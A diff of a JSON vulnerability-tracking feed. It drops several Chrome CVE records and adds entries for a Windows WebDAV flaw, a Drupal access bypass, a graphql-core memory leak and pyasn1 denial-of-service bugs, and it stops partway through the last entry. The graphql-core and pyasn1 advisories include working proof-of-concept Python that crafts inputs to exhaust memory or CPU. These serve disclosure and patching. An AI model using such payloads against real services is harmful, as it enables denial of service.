-        "epss": 0.0
-      },
-      "ai_analysis": ""
-    },
-    {
-      "id": "CVE-2026-119260",
-      "aliases": [],
-      "title": "",
-      "description": "Use after free in Frames in Google Chrome prior to 156.0.8078.79 allowed a remote attacker to execute arbitrary code inside the sandbox via a crafted HTML page. (Chromium security severity: High)",
-      "published": "2026-10-30T01:16:44.663",
-      "updated": "2026-10-30T14:16:41.920",
-      "cvss": 8.8,
-      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H",
-      "severity": "high",
-      "cpes": [],
-      "packages": [],
-      "vendor_products": [],
-      "references": [
-        "https://chromereleases.googleblog.com/2026/10/stable-channel-update-for-desktop_02107719452.html",
-        "https://issues.chromium.org/issues/573264074"
-      ],
-      "exploit_ref": false,
-      "kev": false,
-      "kev_date_added": "",
-      "ransomware": false,
-      "ssvc_exploitation": "",
-      "epss": 0.00198,
-      "epss_percentile": 0.09689,
-      "x_mentions": null,
-      "sources": [
-        "nvd"
-      ],
-      "category": "vuln",
-      "resolved_at": "",
-      "first_seen": "2026-10-30T06:29:46.175004+00:00",
-      "matched": [
-        "chrome"
-      ],
-      "match_type": "keyword",
-      "tier": 1,
-      "score": 48.6,
-      "level": "medium",
-      "score_breakdown": {
-        "popularity": 21.0,
-        "cvss": 17.6,
-        "unauth_network": 5,
-        "rce": 5,
-        "epss": 0.0
-      },
-      "ai_analysis": ""
-    },
-    {
-      "id": "CVE-2026-119262",
-      "aliases": [],
-      "title": "",
-      "description": "Improper input validation in V8 in Google Chrome prior to 156.0.8078.79 allowed a remote attacker to potentially execute arbitrary code inside the sandbox via a crafted HTML page. (Chromium security severity: High)",
-      "published": "2026-10-30T01:16:44.920",
-      "updated": "2026-10-30T14:16:42.327",
-      "cvss": 8.8,
-      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H",
-      "severity": "high",
-      "cpes": [],
-      "packages": [],
-      "vendor_products": [],
-      "references": [
-        "https://chromereleases.googleblog.com/2026/10/stable-channel-update-for-desktop_02107719452.html",
-        "https://issues.chromium.org/issues/574660146"
-      ],
-      "exploit_ref": false,
-      "kev": false,
-      "kev_date_added": "",
-      "ransomware": false,
-      "ssvc_exploitation": "",
-      "epss": 0.00236,
-      "epss_percentile": 0.14663,
-      "x_mentions": null,
-      "sources": [
-        "nvd"
-      ],
-      "category": "vuln",
-      "resolved_at": "",
-      "first_seen": "2026-10-30T06:29:46.175004+00:00",
-      "matched": [
-        "chrome"
-      ],
-      "match_type": "keyword",
-      "tier": 1,
-      "score": 48.6,
-      "level": "medium",
-      "score_breakdown": {
-        "popularity": 21.0,
-        "cvss": 17.6,
-        "unauth_network": 5,
-        "rce": 5,
-        "epss": 0.0
-      },
-      "ai_analysis": ""
-    },
-    {
-      "id": "CVE-2026-119264",
-      "aliases": [],
-      "title": "",
-      "description": "Memory corruption in Dawn in Google Chrome prior to 156.0.8078.79 allowed a remote attacker to potentially execute arbitrary code inside the sandbox via a crafted HTML page. (Chromium security severity: High)",
-      "published": "2026-10-30T01:16:45.177",
-      "updated": "2026-10-30T14:16:42.777",
-      "cvss": 8.8,
-      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H",
-      "severity": "high",
-      "cpes": [],
-      "packages": [],
-      "vendor_products": [],
-      "references": [
-        "https://chromereleases.googleblog.com/2026/10/stable-channel-update-for-desktop_02107719452.html",
-        "https://issues.chromium.org/issues/575150692"
-      ],
-      "exploit_ref": false,
-      "kev": false,
-      "kev_date_added": "",
-      "ransomware": false,
-      "ssvc_exploitation": "",
-      "epss": 0.00198,
-      "epss_percentile": 0.09664,
-      "x_mentions": null,
-      "sources": [
-        "nvd"
-      ],
-      "category": "vuln",
-      "resolved_at": "",
-      "first_seen": "2026-10-30T06:29:46.175004+00:00",
-      "matched": [
-        "chrome"
-      ],
-      "match_type": "keyword",
-      "tier": 1,
-      "score": 48.6,
-      "level": "medium",
-      "score_breakdown": {
-        "popularity": 21.0,
-        "cvss": 17.6,
-        "unauth_network": 5,
-        "rce": 5,
-        "epss": 0.0
-      },
-      "ai_analysis": ""
-    },
-    {
-      "id": "CVE-2026-119265",
-      "aliases": [],
-      "title": "",
-      "description": "Memory corruption in Quota in Google Chrome prior to 156.0.8078.79 allowed a remote attacker to potentially execute arbitrary code inside the sandbox via a crafted HTML page. (Chromium security severity: High)",
-      "published": "2026-10-30T01:16:45.303",
-      "updated": "2026-10-30T14:16:43.030",
-      "cvss": 8.8,
-      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H",
-      "severity": "high",
-      "cpes": [],
-      "packages": [],
-      "vendor_products": [],
-      "references": [
-        "https://chromereleases.googleblog.com/2026/10/stable-channel-update-for-desktop_02107719452.html",
-        "https://issues.chromium.org/issues/575201795"
-      ],
-      "exploit_ref": false,
-      "kev": false,
-      "kev_date_added": "",
-      "ransomware": false,
-      "ssvc_exploitation": "",
-      "epss": 0.00198,
-      "epss_percentile": 0.09663,
-      "x_mentions": null,
-      "sources": [
-        "nvd"
-      ],
-      "category": "vuln",
-      "resolved_at": "",
-      "first_seen": "2026-10-30T06:29:46.175004+00:00",
-      "matched": [
-        "chrome"
-      ],
-      "match_type": "keyword",
-      "tier": 1,
-      "score": 48.6,
-      "level": "medium",
-      "score_breakdown": {
-        "popularity": 21.0,
-        "cvss": 17.6,
-        "unauth_network": 5,
-        "rce": 5,
-        "epss": 0.0
-      },
-      "ai_analysis": ""
-    },
-    {
-      "id": "CVE-2026-119266",
-      "aliases": [],
-      "title": "",
-      "description": "Use after free in Quota in Google Chrome prior to 156.0.8078.79 allowed a remote attacker to potentially execute arbitrary code inside the sandbox via a crafted HTML page. (Chromium security severity: High)",
-      "published": "2026-10-30T01:16:45.430",
-      "updated": "2026-10-30T14:16:43.267",
-      "cvss": 8.8,
-      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H",
-      "severity": "high",
-      "cpes": [],
-      "packages": [],
-      "vendor_products": [],
-      "references": [
-        "https://chromereleases.googleblog.com/2026/10/stable-channel-update-for-desktop_02107719452.html",
-        "https://issues.chromium.org/issues/575202553"
-      ],
-      "exploit_ref": false,
-      "kev": false,
-      "kev_date_added": "",
-      "ransomware": false,
-      "ssvc_exploitation": "",
-      "epss": 0.00198,
-      "epss_percentile": 0.09663,
-      "x_mentions": null,
-      "sources": [
-        "nvd"
-      ],
-      "category": "vuln",
-      "resolved_at": "",
-      "first_seen": "2026-10-30T06:29:46.175004+00:00",
-      "matched": [
-        "chrome"
-      ],
-      "match_type": "keyword",
-      "tier": 1,
-      "score": 48.6,
-      "level": "medium",
-      "score_breakdown": {
-        "popularity": 21.0,
-        "cvss": 17.6,
-        "unauth_network": 5,
-        "rce": 5,
-        "epss": 0.0
-      },
-      "ai_analysis": ""
-    },
-    {
-      "id": "CVE-2026-119267",
-      "aliases": [],
-      "title": "",
-      "description": "Memory corruption in DOM in Google Chrome prior to 156.0.8078.79 allowed a remote attacker to potentially execute arbitrary code inside the sandbox via a crafted HTML page. (Chromium security severity: High)",
-      "published": "2026-10-30T01:16:45.553",
-      "updated": "2026-10-30T14:16:43.597",
-      "cvss": 8.8,
-      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H",
-      "severity": "high",
-      "cpes": [],
-      "packages": [],
-      "vendor_products": [],
-      "references": [
-        "https://chromereleases.googleblog.com/2026/10/stable-channel-update-for-desktop_02107719452.html",
-        "https://issues.chromium.org/issues/576203565"
-      ],
-      "exploit_ref": false,
-      "kev": false,
-      "kev_date_added": "",
-      "ransomware": false,
-      "ssvc_exploitation": "",
-      "epss": 0.00198,
-      "epss_percentile": 0.09664,
-      "x_mentions": null,
-      "sources": [
-        "nvd"
-      ],
-      "category": "vuln",
-      "resolved_at": "",
-      "first_seen": "2026-10-30T06:29:46.175004+00:00",
-      "matched": [
-        "chrome"
-      ],
-      "match_type": "keyword",
-      "tier": 1,
-      "score": 48.6,
-      "level": "medium",
-      "score_breakdown": {
-        "popularity": 21.0,
-        "cvss": 17.6,
-        "unauth_network": 5,
-        "rce": 5,
-        "epss": 0.0
-      },
-      "ai_analysis": ""
-    },
-    {
-      "id": "CVE-2026-119268",
-      "aliases": [],
-      "title": "",
-      "description": "Integer overflow in Editing in Google Chrome prior to 156.0.8078.79 allowed a remote attacker to potentially execute arbitrary code inside the sandbox via a crafted HTML page. (Chromium security severity: High)",
-      "published": "2026-10-30T01:16:45.680",
-      "updated": "2026-10-30T14:16:43.970",
-      "cvss": 8.8,
-      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H",
-      "severity": "high",
-      "cpes": [],
-      "packages": [],
-      "vendor_products": [],
-      "references": [
-        "https://chromereleases.googleblog.com/2026/10/stable-channel-update-for-desktop_02107719452.html",
-        "https://issues.chromium.org/issues/576984708"
-      ],
-      "exploit_ref": false,
-      "kev": false,
-      "kev_date_added": "",
-      "ransomware": false,
-      "ssvc_exploitation": "",
-      "epss": 0.00198,
-      "epss_percentile": 0.09663,
-      "x_mentions": null,
-      "sources": [
-        "nvd"
-      ],
-      "category": "vuln",
-      "resolved_at": "",
-      "first_seen": "2026-10-30T06:29:46.175004+00:00",
-      "matched": [
-        "chrome"
-      ],
-      "match_type": "keyword",
-      "tier": 1,
-      "score": 48.6,
-      "level": "medium",
-      "score_breakdown": {
-        "popularity": 21.0,
-        "cvss": 17.6,
-        "unauth_network": 5,
-        "rce": 5,
-        "epss": 0.0
-      },
-      "ai_analysis": ""
-    },
-    {
-      "id": "CVE-2026-119269",
-      "aliases": [],
-      "title": "",
-      "description": "Use after free in Blink in Google Chrome prior to 156.0.8078.79 allowed a remote attacker to execute arbitrary code inside the sandbox via a crafted HTML page. (Chromium security severity: High)",
-      "published": "2026-10-30T01:16:45.807",
-      "updated": "2026-10-30T14:16:44.230",
-      "cvss": 8.8,
-      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H",
-      "severity": "high",
-      "cpes": [],
-      "packages": [],
-      "vendor_products": [],
-      "references": [
-        "https://chromereleases.googleblog.com/2026/10/stable-channel-update-for-desktop_02107719452.html",
-        "https://issues.chromium.org/issues/577072000"
-      ],
-      "exploit_ref": false,
-      "kev": false,
-      "kev_date_added": "",
-      "ransomware": false,
-      "ssvc_exploitation": "",
-      "epss": 0.00198,
-      "epss_percentile": 0.09664,
-      "x_mentions": null,
-      "sources": [
-        "nvd"
-      ],
-      "category": "vuln",
-      "resolved_at": "",
-      "first_seen": "2026-10-30T06:29:46.175004+00:00",
-      "matched": [
-        "chrome"
-      ],
-      "match_type": "keyword",
-      "tier": 1,
-      "score": 48.6,
-      "level": "medium",
-      "score_breakdown": {
-        "popularity": 21.0,
-        "cvss": 17.6,
-        "unauth_network": 5,
-        "rce": 5,
-        "epss": 0.0
-      },
-      "ai_analysis": ""
-    },
-    {
-      "id": "CVE-2026-119270",
-      "aliases": [],
-      "title": "",
-      "description": "Improper input validation in CacheStorage in Google Chrome prior to 156.0.8078.79 allowed a remote attacker to potentially execute arbitrary code inside the sandbox via a crafted HTML page. (Chromium security severity: High)",
-      "published": "2026-10-30T01:16:45.937",
-      "updated": "2026-10-30T14:16:44.487",
-      "cvss": 8.8,
-      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H",
-      "severity": "high",
-      "cpes": [],
-      "packages": [],
-      "vendor_products": [],
-      "references": [
-        "https://chromereleases.googleblog.com/2026/10/stable-channel-update-for-desktop_02107719452.html",
-        "https://issues.chromium.org/issues/577333729"
-      ],
-      "exploit_ref": false,
-      "kev": false,
-      "kev_date_added": "",
-      "ransomware": false,
-      "ssvc_exploitation": "",
-      "epss": 0.00212,
-      "epss_percentile": 0.11575,
-      "x_mentions": null,
-      "sources": [
-        "nvd"
-      ],
-      "category": "vuln",
-      "resolved_at": "",
-      "first_seen": "2026-10-30T06:29:46.175004+00:00",
       "matched": [
         "chrome"
       ],
@@ -37199,6 +37167,65 @@
       "ai_analysis": ""
     },
     {
+      "id": "CVE-2026-88137",
+      "aliases": [],
+      "title": "",
+      "description": "Files or directories accessible to external parties in WebDAV allows an authorized attacker to disclose information over a network.",
+      "published": "2026-10-13T19:21:33.210",
+      "updated": "2026-10-31T00:27:14.547",
+      "cvss": 6.5,
+      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N",
+      "severity": "medium",
+      "cpes": [
+        "microsoft:windows_10_1607",
+        "microsoft:windows_10_1809",
+        "microsoft:windows_10_21h2",
+        "microsoft:windows_10_22h2",
+        "microsoft:windows_11_23h2",
+        "microsoft:windows_11_24h2",
+        "microsoft:windows_11_25h2",
+        "microsoft:windows_11_26h1",
+        "microsoft:windows_11_26h2",
+        "microsoft:windows_server_2012",
+        "microsoft:windows_server_2016",
+        "microsoft:windows_server_2019",
+        "microsoft:windows_server_2022",
+        "microsoft:windows_server_2025"
+      ],
+      "packages": [],
+      "vendor_products": [],
+      "references": [
+        "https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-88137"
+      ],
+      "exploit_ref": false,
+      "kev": false,
+      "kev_date_added": "",
+      "ransomware": false,
+      "ssvc_exploitation": "",
+      "epss": 0.00952,
+      "epss_percentile": 0.61287,
+      "x_mentions": null,
+      "sources": [
+        "nvd"
+      ],
+      "category": "vuln",
+      "resolved_at": "",
+      "first_seen": "2026-10-31T02:24:15.834484+00:00",
+      "matched": [
+        "windows"
+      ],
+      "match_type": "exact",
+      "tier": 1,
+      "score": 43.1,
+      "level": "medium",
+      "score_breakdown": {
+        "popularity": 30,
+        "cvss": 13.0,
+        "epss": 0.1
+      },
+      "ai_analysis": ""
+    },
+    {
       "id": "CVE-2026-115955",
       "aliases": [],
       "title": "WordPress Advanced Post Block - Post Grid for WordPress block editor plugin <= 2.5.1 - Cross Site Scripting (XSS) vulnerability",
@@ -37919,6 +37946,55 @@
       "score_breakdown": {
         "popularity": 21.0,
         "cvss": 16.4,
+        "unauth_network": 5
+      },
+      "ai_analysis": ""
+    },
+    {
+      "id": "CVE-2026-110176",
+      "aliases": [],
+      "title": "File Force Download for Drupal 7 Access Bypass via Unconditional Download Headers",
+      "description": "The File Force Download module for Drupal 7 implements hook_file_download() to add a Content-Disposition header when a file URL carries the download query parameter. In Drupal 7, returning a non-empty header array from that hook is itself a grant of access to the file.\n\n\n\nIn versions 7.1.0 through 7.1.2, the module only delegated to other modules' hook_file_download() implementations when the file was in the private scheme. For every other scheme it returned its headers without any check. An unauthenticated visitor who appended download=1 to the URL of a file in the temporary:// scheme, or in a stream wrapper supplied by another module, could retrieve the file, overriding the access checks that would otherwise have applied. Files in the public and private schemes are not affected.",
+      "published": "2026-10-31T00:01:51.979Z",
+      "updated": "2026-10-31T01:17:05.153",
+      "cvss": 8.7,
+      "cvss_vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N",
+      "severity": "high",
+      "cpes": [],
+      "packages": [],
+      "vendor_products": [
+        "Drupal File Force Download",
+        "file_force"
+      ],
+      "references": [
+        "https://www.herodevs.com/vulnerability-directory/cve-2026-110176",
+        "https://d7es.tag1.com/security-advisories/file-force-download-critical-access-bypass"
+      ],
+      "exploit_ref": false,
+      "kev": false,
+      "kev_date_added": "",
+      "ransomware": false,
+      "ssvc_exploitation": "",
+      "epss": null,
+      "epss_percentile": null,
+      "x_mentions": null,
+      "sources": [
+        "cve.org",
+        "nvd"
+      ],
+      "category": "vuln",
+      "resolved_at": "",
+      "first_seen": "2026-10-31T02:24:15.834484+00:00",
+      "matched": [
+        "drupal"
+      ],
+      "match_type": "exact",
+      "tier": 2,
+      "score": 42.4,
+      "level": "medium",
+      "score_breakdown": {
+        "popularity": 20,
+        "cvss": 17.4,
         "unauth_network": 5
       },
       "ai_analysis": ""
@@ -38676,6 +38752,60 @@
         "popularity": 21.0,
         "cvss": 15.2,
         "unauth_network": 5
+      },
+      "ai_analysis": ""
+    },
+    {
+      "id": "CVE-2026-119286",
+      "aliases": [
+        "GHSA-mpqx-q82w-9x46"
+      ],
+      "title": "GraphQL-core has denial of service via memory leak in aborted validations",
+      "description": "### Summary\n\nWhen a validation was aborted because the document contained more errors than allowed by `max_errors` (100 by default), `validate()` raised a single module-level `ValidationAbortedError` instance. Python appends the frames of every `raise` to the existing `__traceback__` of an exception that is raised again, so every aborted validation extended the traceback of this shared error. That traceback kept the frames, and with them the document, the validation context and all errors of every aborted validation, alive for the lifetime of the process.\n\n### Details\n\nAny client can trigger an aborted validation by sending a small document with more than 100 validation errors, e.g. 101 unknown fields. No authentication is required, and since validation runs before execution, depth limiters and complexity analyzers do not prevent it. Each such request permanently retained about 124 KiB on CPython 3.12, without an upper limit, so memory grew with every request until the process was restarted or killed.\n\nGraphQL.js uses a shared error object at the same place, but JavaScript errors capture their stack trace only once when they are created, so it is not affected. GraphQL-core 3.2 creates a new error for each aborted validation and is not affected either.\n\n### Proof of concept\n\n```python\nimport gc\nimport tracemalloc\nfrom graphql import build_schema, parse, validate\n\nschema = build_schema(\"type Query { a: Int }\")\ndocument = parse(\"{ \" + \" \".join(f\"f{i}\" for i in range(101)) + \" }\")\n\ntracemalloc.start()\nvalidate(schema, document)\ngc.collect()\nbase = tracemalloc.get_traced_memory()[0]\nfor _ in range(200):\n    validate(schema, document)\ngc.collect()\nprint((tracemalloc.get_traced_memory()[0] - base) // 1024, \"KiB\")\n```\n\nWith GraphQL-core 3.3.0 on CPython 3.12, the retained memory grows from 147 KiB after one call to about 25 MB after 200 calls. With the fix, it stays constant at about 180 KiB.\n\n### Impact\n\nDenial of service through memory exhaustion. A few thousand small requests are enough to push a worker past a typical 256 MB or 512 MB container limit and trigger an OOM kill. No data is disclosed or modified.\n\n### Patches\n\nFixed in **3.3.1**.\n\n`validate()` now creates a new `ValidationAbortedError` for every aborted validation and removes its traceback and exception context before returning it, so that the returned errors do not keep the frames of the validation alive. The module-level `validation_aborted_error` instance, which was not exported, has been removed.\n\n### Workarounds\n\nIf you cannot upgrade, clear the traceback of the shared error after each validation:\n\n```python\nfrom graphql.validation import validate as validate_document\nfrom graphql.validation.validate import validation_aborted_error\n\ndef validate(*args, **kwargs):\n    try:\n        return validate_document(*args, **kwargs)\n    finally:\n        validation_aborted_error.__traceback__ = None\n```\n\nPass this function instead of the original `validate` where your framework allows it.\n\n### Credits\n\nReported by @riodw. @Fire162 submitted a first fix in #288.",
+      "published": "2026-10-30T22:58:31Z",
+      "updated": "2026-10-30T22:58:33Z",
+      "cvss": 7.5,
+      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+      "severity": "high",
+      "cpes": [],
+      "packages": [
+        "pip:graphql-core"
+      ],
+      "vendor_products": [],
+      "references": [
+        "https://github.com/advisories/GHSA-mpqx-q82w-9x46",
+        "https://github.com/graphql-python/graphql-core/security/advisories/GHSA-mpqx-q82w-9x46",
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-119286",
+        "https://github.com/graphql-python/graphql-core/issues/287",
+        "https://github.com/graphql-python/graphql-core/pull/288",
+        "https://github.com/graphql-python/graphql-core/commit/3c319fd9f4b8f6c9db4189520561bf8dd0e70be9"
+      ],
+      "exploit_ref": false,
+      "kev": false,
+      "kev_date_added": "",
+      "ransomware": false,
+      "ssvc_exploitation": "",
+      "epss": 0.00421,
+      "epss_percentile": 0.36465,
+      "x_mentions": null,
+      "sources": [
+        "ghsa"
+      ],
+      "category": "vuln",
+      "resolved_at": "",
+      "first_seen": "2026-10-30T00:25:22.530345+00:00",
+      "matched": [
+        "python"
+      ],
+      "match_type": "keyword",
+      "tier": 1,
+      "score": 41.1,
+      "level": "medium",
+      "score_breakdown": {
+        "popularity": 21.0,
+        "cvss": 15.0,
+        "unauth_network": 5,
+        "epss": 0.1
       },
       "ai_analysis": ""
     },
@@ -43155,6 +43285,222 @@
       "ai_analysis": ""
     },
     {
+      "id": "CVE-2026-119196",
+      "aliases": [
+        "GHSA-2qm8-x737-gmw5"
+      ],
+      "title": "pyasn1 has quadratic CPU consumption in constructed BIT STRING decoding",
+      "description": "## Summary\n\nIn pyasn1 through 0.6.4, decoding a constructed BIT STRING with many fragments repeatedly shifts and copies the entire value accumulated so far. For fixed-size fragments, CPU time grows quadratically with the encoded input size. An application that passes sufficiently large, attacker-controlled ASN.1 data to an affected decoder can suffer CPU exhaustion during `decode()`; no conversion or formatting of the decoded value is required.\n\nThe BER and CER decoders reach this path for constructed BIT STRING values, with or without an `asn1Spec`. The DER decoder rejects constructed BIT STRING in schema-less decoding, but its schema-driven path accepts a **definite-length** constructed BIT STRING when given a matching `asn1Spec` and reaches the same vulnerable code. Constructed BIT STRING is not valid DER; this DER exposure is due to decoder permissiveness. DER rejects the indefinite-length form.\n\nThis is a separate decoder path from the OBJECT IDENTIFIER accumulation fixed in [CVE-2026-59885](https://github.com/advisories/GHSA-8ppf-4f7h-5ppj).\n\n## Technical details\n\nIn the 0.6.4 [`BitStringPayloadDecoder`](https://github.com/pyasn1/pyasn1/blob/v0.6.4/pyasn1/codec/ber/decoder.py#L173-L301), both the [definite-length](https://github.com/pyasn1/pyasn1/blob/v0.6.4/pyasn1/codec/ber/decoder.py#L237-L255) and [indefinite-length](https://github.com/pyasn1/pyasn1/blob/v0.6.4/pyasn1/codec/ber/decoder.py#L275-L301) fragment loops call `BitString.fromOctetString(..., prepend=bitString)` for every fragment. [`fromOctetString`](https://github.com/pyasn1/pyasn1/blob/v0.6.4/pyasn1/type/univ.py#L614-L627) shifts the growing `SizedInteger` left by the fragment's bit length and ORs in the fragment. Shifting an ever-larger Python integer for each fixed-size fragment makes total work O(n²) for n fragments. The fragments are siblings, so the decoder's nesting-depth limit does not constrain their count; its limit on the number of length octets does not prevent the demonstrated inputs.\n\nIn 0.6.4, DER's [tag-driven map](https://github.com/pyasn1/pyasn1/blob/v0.6.4/pyasn1/codec/der/decoder.py#L15-L40) disables constructed BIT STRING, while its schema-driven type map retains the inherited decoder that permits it. This explains why a schema-less DER rejection is not a negative result for all DER decoding.\n\nUnder [X.690](https://www.itu.int/rec/T-REC-X.690-202102-I/en), a conforming CER constructed BIT STRING uses an indefinite-length outer encoding and primitive fragments with 1000 contents octets except possibly the last. That form reaches the affected indefinite-length loop. DER requires primitive string encoding, although the schema-driven pyasn1 decoder accepts the definite-length constructed example below.\n\n## Impact\n\nAn application is exposed when untrusted input can reach one of the affected decoder paths and its input limits admit enough fragments. The work occupies the decoding thread or worker and may cause denial of service. Whether the input is network-accessible or unauthenticated depends on the calling application. This advisory makes no claim that every application using pyasn1, or any particular protocol implementation, accepts such input.\n\n## Severity assessment (CVSS v3.1)\n\nThe 7.5 Base score assumes a reasonable application that automatically decodes attacker-supplied ASN.1 from unauthenticated network input. Valid BER and conforming CER values trigger the issue without special conditions, privileges, or user interaction. Repeated crafted values could occupy a finite decoder-worker pool and deny service while the attack continues. No confidentiality or integrity impact is demonstrated. This library-level score does not claim that every application is network-exposed or fully unavailable; deployment-specific input limits and architecture may change the score. See [FIRST's library-scoring guidance](https://www.first.org/cvss/v3-1/user-guide).\n\n## Reproducer\n\nThe definite-length example below is valid BER. It is deliberately not a conforming CER or DER encoding. The second constructor uses conforming CER fragment sizing and framing. CPU times are machine-dependent; run the larger cases only in a local test environment.\n\n```python\nimport time\n\nfrom pyasn1.codec.ber import decoder as ber_decoder\nfrom pyasn1.codec.cer import decoder as cer_decoder\nfrom pyasn1.codec.der import decoder as der_decoder\nfrom pyasn1.error import PyAsn1Error\nfrom pyasn1.type import univ\n\n\ndef encode_length(size):\n    octets = size.to_bytes((size.bit_length() + 7) // 8, \"big\")\n    return bytes((0x80 | len(octets),)) + octets\n\n\ndef definite_fragments(count):\n    body = b\"\\x03\\x02\\x00\\xa5\" * count  # one data octet per BIT STRING fragment\n    return b\"\\x23\" + encode_length(len(body)) + body\n\n\ndef cer_fragments(count):\n    # Each primitive fragment has 1000 contents octets: one unused-bits\n    # octet (zero) followed by 999 data octets.\n    fragment = b\"\\x03\" + encode_length(1000) + b\"\\x00\" + b\"\\xa5\" * 999\n    return b\"\\x23\\x80\" + fragment * count + b\"\\x00\\x00\"\n\n\ndef measure(label, decode, payload, **options):\n    start = time.process_time()\n    value, remainder = decode(payload, **options)\n    print(label, len(payload), f\"{time.process_time() - start:.3f}s CPU\")\n    assert not remainder and len(value) > 0\n\n\nfor count in (50_000, 100_000, 200_000):\n    measure(f\"BER {count} fragments\", ber_decoder.decode,\n            definite_fragments(count))\n\nfor count in (1_000, 2_000, 4_000):\n    measure(f\"CER {count} fragments\", cer_decoder.decode,\n            cer_fragments(count))\n\nsample = definite_fragments(1_000)\nmeasure(\"DER with BIT STRING schema\", der_decoder.decode, sample,\n        asn1Spec=univ.BitString())\ntry:\n    der_decoder.decode(sample)\nexcept PyAsn1Error:\n    print(\"DER without schema rejects the constructed value\")\nelse:\n    raise AssertionError(\"DER unexpectedly accepted schema-less input\")\n```\n\n## Verification\n\nLocal measurements of the official v0.6.4 tag on CPython 3.14.8 used `time.process_time()`. A local 0.6.5 candidate containing the fix was timed on the same machine. Times are illustrative, not a guaranteed cost on other systems.\n\n| Input | Size | v0.6.4 CPU | 0.6.5 candidate CPU |\n| --- | ---: | ---: | ---: |\n| BER definite, 50,000 fragments | 0.20 MB | 0.530 s | 0.084 s |\n| BER definite, 100,000 fragments | 0.40 MB | 1.915 s | 0.170 s |\n| BER definite, 200,000 fragments | 0.80 MB | 7.392 s | 0.344 s |\n| Conforming CER, 1,000 fragments | 1.004 MB | 0.163 s | 0.0035 s |\n| Conforming CER, 2,000 fragments | 2.008 MB | 0.657 s | 0.0070 s |\n| Conforming CER, 4,000 fragments | 4.016 MB | 2.582 s | 0.0144 s |\n\nThe definite BER input with 100,000 fragments also decoded through DER with `asn1Spec=univ.BitString()` in 1.949 s on v0.6.4, versus 0.172 s with the 0.6.5 candidate. Schema-less DER rejected the same input. Independent reports reproduced the old behavior on v0.6.4: one measured 21.1 s for a 1.28 MB definite-length value; another measured 7.25 s for a 0.8 MB value versus 2.8 ms for a primitive BIT STRING carrying the same data volume. These measurements were taken on different systems and should not be compared as a single benchmark series.\n\n## Resolution\n\nUpgrade to pyasn1 0.6.5. The decoder assembles fragment bits in a `bytearray`, preserves decoded bit values including intermediate-fragment padding, and converts the complete payload to a BIT STRING once. This removes the repeated shift of the growing integer in both constructed decoding loops.\n\nFor applications that cannot upgrade immediately, enforce an application-appropriate limit on untrusted ASN.1 input size **before** passing it to pyasn1. Such a limit bounds exposure but does not change the quadratic behavior of 0.6.4. Where a protocol forbids constructed BIT STRING, rejecting that encoding before decoding also prevents this path.",
+      "published": "2026-10-30T23:07:04Z",
+      "updated": "2026-10-30T23:07:05Z",
+      "cvss": 7.5,
+      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+      "severity": "high",
+      "cpes": [],
+      "packages": [
+        "pip:pyasn1"
+      ],
+      "vendor_products": [],
+      "references": [
+        "https://github.com/advisories/GHSA-2qm8-x737-gmw5",
+        "https://github.com/pyasn1/pyasn1/security/advisories/GHSA-2qm8-x737-gmw5",
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-119196",
+        "https://github.com/pyasn1/pyasn1/pull/132",
+        "https://github.com/pyasn1/pyasn1/commit/73ba7b043cc7e92cb37f16f2c955bff93b0e6f6c",
+        "https://github.com/pyasn1/pyasn1/releases/tag/v0.6.5"
+      ],
+      "exploit_ref": false,
+      "kev": false,
+      "kev_date_added": "",
+      "ransomware": false,
+      "ssvc_exploitation": "",
+      "epss": 0.00425,
+      "epss_percentile": 0.36799,
+      "x_mentions": null,
+      "sources": [
+        "ghsa"
+      ],
+      "category": "vuln",
+      "resolved_at": "",
+      "first_seen": "2026-10-31T02:24:15.834484+00:00",
+      "matched": [
+        "python"
+      ],
+      "match_type": "keyword",
+      "tier": 1,
+      "score": 41.1,
+      "level": "medium",
+      "score_breakdown": {
+        "popularity": 21.0,
+        "cvss": 15.0,
+        "unauth_network": 5,
+        "epss": 0.1
+      },
+      "ai_analysis": ""
+    },
+    {
+      "id": "CVE-2026-119197",
+      "aliases": [
+        "GHSA-mm57-4v3p-rchx"
+      ],
+      "title": "pyasn1 has quadratic-complexity denial of service in binary REAL decoding",
+      "description": "## Summary\n\nIn pyasn1 0.6.4 and earlier, decoding a binary-encoded ASN.1 REAL with a large mantissa can consume CPU time quadratic in the mantissa length. The BER, CER, and DER decoders all use the affected `RealPayloadDecoder`. An application is exposed when it passes attacker-controlled ASN.1 containing a REAL value to one of these decoders, either without an `asn1Spec` or with a schema that includes REAL. The work occurs inside `decode()`; the application does not need to convert, print, or otherwise use the resulting REAL object.\n\nThis is distinct from [CVE-2026-59886](https://github.com/advisories/GHSA-hm4w-wwcw-mr6r), which concerns converting an already-decoded REAL to a Python float. That issue was fixed in 0.6.4 and its advisory states that decoding alone does not trigger it.\n\n## Root cause and affected components\n\nFor binary REAL values, [`RealPayloadDecoder.valueDecoder` in v0.6.4](https://github.com/pyasn1/pyasn1/blob/v0.6.4/pyasn1/codec/ber/decoder.py#L535-L603) builds the mantissa one octet at a time:\n\n```python\np = 0\nwhile chunk:\n    p <<= 8\n    p |= chunk[0]\n    chunk = chunk[1:]\n```\n\nEach shift processes an integer that grows with the mantissa; with byte strings, each slice also copies the remaining suffix. Repeating both operations for every octet makes decoding quadratic in mantissa 